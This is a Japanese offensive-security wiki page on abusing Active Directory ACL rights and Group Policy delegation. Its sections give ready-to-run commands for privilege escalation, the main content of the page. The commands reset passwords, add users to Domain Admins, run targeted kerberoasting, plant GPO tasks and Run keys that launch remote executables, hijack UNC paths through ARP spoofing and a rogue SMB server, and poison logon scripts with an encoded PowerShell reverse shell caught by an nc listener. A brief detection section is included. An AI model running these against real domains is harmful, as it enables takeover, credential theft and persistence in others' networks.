# Active Directory ACLs/ACEs の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **のテクニックをまとめたものです。詳細については、元の記事を確認してください。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **ユーザーに対する GenericAll 権限**

この権限により、攻撃者は対象ユーザーアカウントを完全に制御できます。`Get-ObjectAcl` コマンドを使用して `GenericAll` 権限が確認されると、攻撃者は次の操作を実行できます。

- **対象ユーザーのパスワードを変更する**: `net user <username> <password> /domain` を使用して、攻撃者はユーザーのパスワードをリセットできます。
- Linux では、Samba の `net rpc` を使用して SAMR 経由で同じ操作を実行できます:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **アカウントが無効化されている場合、UAC フラグをクリアする**: `GenericAll` では `userAccountControl` を編集できます。Linux からは、BloodyAD で `ACCOUNTDISABLE` フラグを削除できます:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: ユーザーのアカウントにSPNを割り当ててkerberoast可能にし、その後RubeusとtargetedKerberoast.pyを使用してticket-granting ticket (TGT)のハッシュを抽出し、crackを試みる。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの pre-authentication を無効化し、そのアカウントを ASREPRoasting に対して脆弱にする。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: ユーザーに対する `GenericAll` があれば、証明書ベースの credential を追加し、パスワードを変更せずにそのユーザーとして authenticate できます。以下を参照してください:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **グループに対する GenericAll Rights**

この権限により、攻撃者は `Domain Admins` のようなグループに対する `GenericAll` rights を持っている場合、グループ membership を操作できます。`Get-NetGroup` を使用してグループの distinguished name を特定した後、攻撃者は次の操作を実行できます:

- **自分自身を Domain Admins グループに追加する**: これは直接コマンドを実行するか、Active Directory や PowerSploit などの modules を使用して実行できます。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linuxからは、対象グループに対する GenericAll/Write 権限を持っている場合、BloodyADを使って自分自身を任意のグループに追加することもできます。対象グループが「Remote Management Users」にネストされている場合、そのグループを受け入れるホストへのWinRMアクセスを直ちに取得できます。<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

コンピューターオブジェクトまたはユーザーアカウントに対してこれらの権限を保持している場合、以下が可能です。

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトの takeover を可能にします。
- **Shadow Credentials**: Shadow Credentials を作成する権限を悪用して、コンピューターまたはユーザーアカウントになりすますためにこの technique を使用します。

## **WriteProperty on Group**

ユーザーが特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対する `WriteProperty` 権限を持っている場合、以下が可能です。

- **Add Themselves to the Domain Admins Group**: `net user` と `Add-NetGroupUser` コマンドを組み合わせて実行することで、ドメイン内での privilege escalation が可能になります。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使用して、`Domain Admins` などの特定のグループに自分自身を追加できます。次のコマンドシーケンスを使用すると、自分自身を追加できます：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty（自己メンバーシップ）**

同様の権限により、攻撃者はグループに対する `WriteProperty` 権限を持っている場合、グループのプロパティを変更して自分自身を直接グループに追加できます。この権限の確認と実行は、次のコマンドで行います：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

ユーザーに対して `User-Force-Change-Password` の `ExtendedRight` を保持している場合、現在のパスワードを知らなくてもパスワードをリセットできます。この権限の確認と悪用は、PowerShell または代替のコマンドラインツールを使用して実行でき、インタラクティブセッションや非対話型環境向けのワンライナーなど、ユーザーのパスワードをリセットする複数の方法があります。コマンドは単純な PowerShell の呼び出しから、Linux 上で `rpcclient` を使用する方法まで多岐にわたり、攻撃ベクトルの柔軟性を示しています。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

攻撃者がグループに対する `WriteOwner` 権限を持っていることを発見した場合、そのグループの所有者を自分自身に変更できます。対象のグループが `Domain Admins` の場合、所有権の変更によってグループ属性やメンバーシップをより広範に制御できるため、特に影響が大きくなります。このプロセスでは、`Get-ObjectAcl` を使用して正しいオブジェクトを特定し、その後 `Set-DomainObjectOwner` を使用して、SID または名前によって所有者を変更します。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` access を使用して、ユーザーのログオン時に悪意のある script を実行するよう、ユーザーのログオン script path を変更できます。これは、`Set-ADObject` command を使用して、対象ユーザーの `scriptpath` property を攻撃者の script を指すように更新することで実現します。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

この権限により、攻撃者はグループメンバーシップを操作し、自分自身や他のユーザーを特定のグループに追加できます。このプロセスでは、credential objectを作成し、それを使用してグループへのユーザーの追加または削除を行い、PowerShellコマンドでメンバーシップの変更を確認します。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux から、グループに対する `GenericWrite` を保持している場合、Samba の `net` でメンバーを追加または削除できます（PowerShell/RSAT を利用できない場合に便利です）：<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD オブジェクトを所有し、そのオブジェクトに対する `WriteDACL` 権限を持つことで、攻撃者は自分自身にそのオブジェクトの `GenericAll` 権限を付与できます。これは ADSI 操作によって実現され、オブジェクトを完全に制御し、そのグループメンバーシップを変更できるようになります。ただし、Active Directory module の `Set-Acl` / `Get-Acl` cmdlet を使用してこれらの権限を悪用しようとすると、制限があります。<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner による迅速な takeover (PowerView)

ユーザーまたはサービスアカウントに対して `WriteOwner` と `WriteDacl` を持っている場合、古いパスワードを知らなくても、PowerView を使用して完全な制御を取得し、そのパスワードをリセットできます：
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:
- `WriteOwner` しか持っていない場合は、まず所有者を自分自身に変更する必要があります。
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- パスワードリセット後、任意のプロトコル（SMB/LDAP/RDP/WinRM）でアクセスを検証します。

## **ドメイン上での Replication（DCSync）**

DCSync attack は、ドメイン上の特定の replication permissions を悪用して Domain Controller になりすまし、ユーザーの credentials などのデータを同期します。この強力な technique には、攻撃者が Domain Controller に直接アクセスすることなく AD environment から機密情報を抽出できる、`DS-Replication-Get-Changes` などの permissions が必要です。<sup>[[5]](#references)</sup> [**DCSync attack の詳細はこちら。**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects（GPOs）を管理する delegated access には、重大な security risks が生じる可能性があります。たとえば、`offense\spotless` のような user に GPO management rights が delegated されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner** などの privileges を持つ可能性があります。PowerView を使用して特定できるように、これらの permissions は malicious purposes に悪用される可能性があります：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions の Enumerate

Misconfigured GPOs を特定するには、PowerSploit の cmdlets を chain できます。これにより、特定の user が管理 permissions を持つ GPOs を discovery できます：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定の Policy が適用された Computers**: 特定の GPO がどの computers に適用されるかを resolve できるため、潜在的な impact の範囲を把握するのに役立ちます。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定の Computer に適用された Policies**: 特定の computer にどの policies が適用されているかを確認するには、`Get-DomainGPO` などの commands を利用できます。

**特定の Policy が適用された OUs**: `Get-DomainOU` を使用して、指定した policy の影響を受ける organizational units（OUs）を特定できます。

tool の [**GPOHound**](https://github.com/cogiceo/GPOHound) を使用して GPOs を enumerate し、内部の issues を見つけることもできます。

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs を exploit して code を execute できます。たとえば、immediate scheduled task を作成する方法があります。これにより、影響を受ける machines の local administrators group に user を追加し、privileges を大幅に elevate できます。
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module がインストールされている場合、新しい GPO の作成およびリンクや、影響を受けるコンピューター上で backdoors を実行するためのレジストリ値などの設定が可能です。この方法では、GPO が更新され、実行対象のコンピューターにユーザーがログインする必要があります。
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、新しいGPOを作成せずに、タスクを追加したり設定を変更したりして既存のGPOを悪用する方法を提供します。このツールを使用するには、既存のGPOを変更するか、RSAT toolsを使用して変更を適用する前に新しいGPOを作成する必要があります。
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシーの強制更新

GPO の更新は通常、約 90 分ごとに行われます。この処理を早めるには、特に変更を実装した後、対象コンピューター上で `gpupdate /force` コマンドを使用して、ポリシーを即時更新できます。このコマンドにより、次回の自動更新サイクルを待たずに、GPO への変更が適用されます。

### 内部動作

`Misconfigured Policy` など、特定の GPO の Scheduled Tasks を確認すると、`evilTask` などのタスクが追加されていることを確認できます。これらのタスクは、システムの動作を変更したり、権限を昇格したりする目的で、スクリプトまたはコマンドラインツールによって作成されます。

`New-GPOImmediateTask` によって生成された XML 設定ファイルに示されるタスクの構造には、実行するコマンドやトリガーなど、Scheduled Task の詳細が記載されています。このファイルは、GPO 内で Scheduled Tasks がどのように定義・管理されるかを示しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する手段を提供します。

### ユーザーとグループ

GPO では、対象システム上のユーザーおよびグループのメンバーシップを操作することもできます。Users and Groups のポリシーファイルを直接編集することで、攻撃者はユーザーをローカルの `administrators` グループなどの特権グループに追加できます。これは、GPO 管理権限の委任によって可能になります。この権限により、ポリシーファイルを変更して新しいユーザーを追加したり、グループメンバーシップを変更したりできます。

Users and Groups の XML 設定ファイルには、これらの変更を実装する方法が記載されています。このファイルにエントリを追加することで、特定のユーザーに影響を受けるシステム全体で昇格された権限を付与できます。この方法は、GPO manipulation を通じて直接 privilege escalation を行う手段となります。

さらに、logon/logoff scripts の利用、autorun 用のレジストリキーの変更、.msi ファイルによるソフトウェアのインストール、サービス設定の編集など、コードを実行したり persistence を維持したりする追加の方法も検討できます。これらの technique により、GPO の abuse を通じてアクセスを維持し、対象システムを制御するさまざまな方法が提供されます。

### 認証済みの rogue service への GPC/GPT 取得先のリダイレクト

GPO は、メタデータを含む LDAP の **Group Policy Container (GPC)** と、ポリシーファイルを含む SMB-hosted **Group Policy Template (GPT)** で構成されます。更新時、クライアントはコンテナーの `gPLink` に従い、参照先の GPC とその `gPCFileSysPath` を読み取り、その UNC パスから GPT をダウンロードします。そのため、GPC 自体、または OU、Site、Domain の `gPLink` への write access は、privileged policy processing に変換できます。<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity による `gPCFileSysPath` poisoning

controlled principal が対象 GPC に write できる場合（直接、または **NTLM relay to LDAP** を介して）、`gPCFileSysPath` を攻撃者がホストする UNC パスに置き換えます。[GPOddity](https://github.com/synacktiv/GPOddity) は LDAP の変更を自動化し、module-based policy files または Group Policy client が `NT AUTHORITY\SYSTEM` として実行する Immediate Task を含む malicious GPT を提供します。<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

現在の Windows クライアントでは、anonymous または credential-agnostic な SMB share だけでは不十分です。SMB Secure Negotiate では認証が成功したことの証明が必要なため、rogue service は domain identity を検証し、SMB session key を導出し、レスポンスに正しく署名する必要があります。embedded mode では、controlled machine account とその service key を使用して GPOddity を設定し、`[COMMANDS]` セクションで computer-side または user-side payload を選択します。<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**User GPO のエッジケース:** MS16-072 の後も、Windows は**同じ TCP 接続**内に 2 つの SMB2 セッションを作成します。ユーザーセッションが `GPT.INI` を読み取り、その後、コンピューターアカウントのセッションが `ScheduledTasks.xml` などの有効な構成を読み取ります。そのため、rogue server は認証状態、セッションキー、署名キーをソケットだけでなく SMB2 の `SessionId` ごとに管理する必要があります。GPOddity/OUned に組み込まれた Scapy fork は、`SMBStreamSocketMultiplexing` と多重化対応の `SMBServer` によってこれを実装しています。一方、single-session の Impacket/Scapy サーバーは誤った署名状態を再利用するため、ユーザーポリシーで失敗します。<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

`WriteGPLink`、`GenericWrite`、または OU、Site、Domain に対する同等の制御権があれば、攻撃者は GPC DN が攻撃者の管理する LDAP host によって提供されるリンクを追加できます。この手法は Petros Koutroumpis によって最初に紹介されました。[OUned](https://github.com/synacktiv/OUned) は、LDAP write と悪意のある GPC/GPT chain を自動化します。<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
被害者はまず rogue LDAP service に認証し、`gPCFileSysPath` が rogue SMB service を指す GPC を受け取ります。その後、SMB に認証して、提供された GPT を適用します。したがって、OUned には LDAP SPN を持つアカウント、SMB 用の HOST SPN を持つ machine account（同じ machine account で両方を満たせます）、およびポート 389 と 445 を operator host に送る DNS 解決または reverse forwarding が必要です。<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned の組み込み Scapy LDAP server は、実際の制御対象 service key を使用して Kerberos/SPNEGO を検証し、JSON から任意の GPC data を提供します。空の JSON key は rootDSE をモデル化し、`base64:` prefix は binary values を表します。また、server は add/delete/modify/search と、`BASE`、`LEVEL`、`SUBTREE` search をサポートし、protection なし、integrity、confidentiality をネゴシエートできます。これにより、攻撃者が制御する LDAP reference に従う一方で authenticated LDAP を要求する別の Windows component に対して、この service を再利用できます。<sup>[[15]](#references)</sup>

account password を dummy domain に同期すれば、すべての Kerberos key が再現されるとは限りません。RC4 は password から導出されますが、AES string-to-key は principal の hostname/domain から導出された salt も使用します。実際の account AES key を `KerberosSSP` に指定すれば、machine account 自身が書き込み可能な `msDS-SupportedEncryptionTypes` を検出可能な変更によって変更し、RC4 を強制する必要がなくなります。<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` または `gPLink` への変更を、GPO version の変更および新しい Immediate/Scheduled Task XML と相関させます。想定外の naming context への link、承認済みの DC/SYSVOL set 外にある UNC host、machine-account name を redirect する DNS record、通常とは異なる machine account に対する LDAP/CIFS service ticket、そして RC4 を有効化する `msDS-SupportedEncryptionTypes` の変更を調査します。<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain に対する `WriteGPLink` により、対象 container の `gPLink` attribute を変更し、GPO 自体を編集せずに **既存の GPO を強制的に適用**できます。link された GPO がすでに **UNC path**（`\\HOST\share\...`）経由の remote content を参照している場合、authenticated user は **SYSVOL** を読み取り、再利用可能な policy を offline で探せるため、これは興味深い攻撃手法になります。<sup>[[11]](#references)</sup>

High-level workflow:

1. BloodHound を使用して、OU に対する `WriteGPLink` を持つ principal を特定し、その OU 内の computer/user を列挙します。
2. `SYSVOL` を read-only で clone し、UNC path を参照する **Software Installation**、**drive mapping**（`Drives.xml`）、**logon/startup script** を探すために GPO を parse します。
3. DFS/domain-namespace path ではなく、**direct hostname**（例：`\\DC02\share\pkg.msi`）を指す policy を優先します。hostname ベースの path のほうが、L2 spoofing で redirect しやすいためです。
4. 選択した GPO GUID を対象 OU の `gPLink` に追加し、victim がその既存の policy を処理するようにします。
5. 同じ broadcast domain 上で UNC host に対して ARP spoof を行い、その IP を local に bind します（`ip addr add <target_ip>/32 dev <iface>`）。これにより、victim の SMB traffic が自分の host に到達します。
6. attacker SMB server（例：`smbserver.py`）から想定される path/filename を提供し、通常の policy processing を待ちます。

`SYSVOL` collection と GPO correlation の例：
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
既存のGPOを対象OUにリンクします：
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

リンクされた GPO が UNC パスから MSI を deploy する場合、client は **computer startup** 時にそれを取得し、**`NT AUTHORITY\SYSTEM`** として install します。参照されている host を spoof し、**同じ share/path/name** で malicious MSI を提供することで、**SYSVOL を変更せずに** `WriteGPLink` を SYSTEM code execution に変えられます。

重要な制約:

- **Timing matters**: 新しい link は policy refresh（通常は約 90 分）時に認識されますが、**Software Installation** は通常 **reboot** 時に trigger されます。
- Windows Installer は通常、package の **`ProductCode`** を使用して deployment を追跡します。product がすでに install されている場合、deployment が skip されることがあります。
- installer に reject されないよう、rogue MSI を patch し、その **`ProductCode`** と **`PackageCode`** を GPO が想定する legitimate package と一致させます。
- 古い `.aas` advertisement files が `SYSVOL` に残っている可能性があるため、これに依存する前に deployment が active に見えることを validate してください。
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` の GPP drive mappings により、ユーザーはログオン時または再接続時に設定された UNC path へ認証を行います。参照先の host を spoof すると、**NetNTLMv2** を capture できます。SMB を意図的に失敗させると、Windows は **WebDAV** 経由で再試行し、**NTLM over HTTP** を送信する場合があります。これは **LDAP(S)**、**AD CS**、または **SMB** への relay において、はるかに柔軟です。

#### Logon/startup script UNC hijack

同じパターンは、`SYSVOL` で見つかる UNC-hosted scripts にも適用できます。

- **Logon scripts** は通常、**user** context で実行されます。
- **Startup scripts** は通常、**computer / SYSTEM** context で実行されます。

script path が spoofable hostname を指している場合、UNC host を redirect し、想定された location から replacement script content を提供します。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` 配下の writable paths では、GPO 経由で user logon 時に実行される logon scripts を tampering できます。これにより、ログオンするユーザーの security context で code execution が可能になります。

### Locate logon scripts
- configured logon script について user attributes を確認します。
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- ドメイン共有をクロールし、スクリプトへのショートカットや参照を洗い出す:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` ファイルを解析して、SYSVOL/NETLOGON を指すターゲットを解決する（DFIR の便利なトリックであり、GPO に直接アクセスできない攻撃者にも有用）：
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound は、存在する場合、ユーザーノード上に `logonScript`（scriptPath）属性を表示します。

### 書き込みアクセスを検証する（share listingsを信頼しない）
自動化されたtoolingでは SYSVOL/NETLOGON が読み取り専用として表示されることがありますが、基盤となる NTFS ACL では依然として書き込みが許可されている場合があります。必ずテストしてください：
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
ファイルサイズまたはmtimeが変更された場合、write権限があります。変更前にオリジナルを保存してください。

### RCEのためにVBScript logon scriptを汚染する
PowerShell reverse shellを起動するコマンド（revshells.comから生成）を追加し、業務機能を壊さないように元のロジックを維持します：
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
ホスト上で待ち受け、次の対話型ログオンを待機します。
```bash
rlwrap -cAr nc -lnvp 443
```
注:
- Execution は logging user の token（SYSTEM ではありません）で実行されます。Scope は、その script を適用する GPO link（OU、site、domain）です。
- 使用後は、元の content/timestamps を復元して後処理します。


## References

- [1] [Active Directory ACLs/ACEs の悪用](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [特権アカウントと Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path の更新](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory の ACL による権限昇格](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory の Privileges と特権アカウントのスキャン](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux からの AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc（group membership）](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、DPAPI decryption による DC admin への権限昇格](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution と NTLM Relay のための GPO UNC Paths の Hijacking](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relaying などによる Active Directory GPOs の exploitation](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory における hidden Organizational Units ACL attack vectors の exploitation](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [ネットワーク上で legitimate Active Directory services をシミュレートする: GPO exploitation の事例](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
